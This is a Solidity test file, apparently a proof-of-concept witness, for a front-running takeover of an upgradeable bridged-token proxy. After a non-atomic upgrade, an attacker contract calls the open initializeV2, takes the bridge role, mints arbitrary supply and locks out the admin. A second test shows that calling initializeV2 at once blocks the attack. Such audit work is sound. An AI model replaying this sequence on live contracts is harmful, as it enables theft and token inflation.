// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    ICustomBridgedTokenLike,
    LineaF3SimpleProxy,
    BridgedTokenV1Like,
    CustomBridgedTokenV2Like,
    LineaF3InitV2Attacker
} from "../src/LineaF3CustomBridgedTokenInitV2TakeoverHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for CustomBridgedToken initializeV2 takeover.
contract LineaF3CustomBridgedTokenInitV2TakeoverTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_take_bridge_role_after_non_atomic_upgrade() public {
        address admin = address(0xA11CE);
        address tokenBridge = address(0xB0B);
        address user = address(0xCAFE);
        address attackerEOA = address(0xBEEF);

        BridgedTokenV1Like implementationV1 = new BridgedTokenV1Like();
        CustomBridgedTokenV2Like implementationV2 = new CustomBridgedTokenV2Like();
        LineaF3SimpleProxy proxy = new LineaF3SimpleProxy(admin);
        ICustomBridgedTokenLike token = ICustomBridgedTokenLike(address(proxy));
        LineaF3InitV2Attacker attacker = new LineaF3InitV2Attacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementationV1));

        vm.prank(tokenBridge);
        token.initialize("bridgeToken", "BT", 18);
        require(token.bridge() == tokenBridge, "bridge must be token bridge after v1 init");
        require(token.initializedVersion() == 1, "initializer version should be 1");

        vm.prank(tokenBridge);
        token.mint(user, 1);
        require(token.balanceOf(user) == 1, "baseline mint by token bridge should succeed");

        // Non-atomic upgrade performed without call data.
        vm.prank(admin);
        proxy.upgradeTo(address(implementationV2));

        vm.prank(attackerEOA);
        attacker.seizeBridgeAndMint(address(proxy), user, 1_000_000);

        require(token.bridge() == address(attacker), "attacker must seize bridge role");
        require(token.initializedVersion() == 2, "attacker should consume reinitializer(2)");
        require(token.balanceOf(user) == 1_000_001, "attacker should mint arbitrary supply");

        vm.prank(tokenBridge);
        (bool oldBridgeCanMint,) = address(proxy).call(
            abi.encodeWithSelector(ICustomBridgedTokenLike.mint.selector, user, 1)
        );
        require(!oldBridgeCanMint, "original token bridge should lose mint authority");

        vm.prank(admin);
        (bool adminCanRecover,) = address(proxy).call(
            abi.encodeWithSelector(
                ICustomBridgedTokenLike.initializeV2.selector, "recover", "RCV", 18, tokenBridge
            )
        );
        require(!adminCanRecover, "admin should be locked out once attacker consumes initializeV2");
    }

    function test_attacker_fails_when_admin_calls_initializeV2_immediately() public {
        address admin = address(0xA11CE);
        address tokenBridge = address(0xB0B);
        address user = address(0xCAFE);
        address attackerEOA = address(0xBEEF);

        BridgedTokenV1Like implementationV1 = new BridgedTokenV1Like();
        CustomBridgedTokenV2Like implementationV2 = new CustomBridgedTokenV2Like();
        LineaF3SimpleProxy proxy = new LineaF3SimpleProxy(admin);
        ICustomBridgedTokenLike token = ICustomBridgedTokenLike(address(proxy));

        vm.prank(admin);
        proxy.upgradeTo(address(implementationV1));
        vm.prank(tokenBridge);
        token.initialize("bridgeToken", "BT", 18);

        vm.prank(admin);
        proxy.upgradeTo(address(implementationV2));
        vm.prank(admin);
        token.initializeV2("custom", "CST", 18, tokenBridge);

        vm.prank(attackerEOA);
        (bool attackerCanSeize,) = address(proxy).call(
            abi.encodeWithSelector(LineaF3InitV2Attacker.seizeBridgeAndMint.selector, address(proxy), user, 10)
        );
        require(!attackerCanSeize, "attacker should fail when admin already consumed initializeV2");

        vm.prank(tokenBridge);
        token.mint(user, 1);
        require(token.balanceOf(user) == 1, "legitimate bridge remains in control");
    }
}
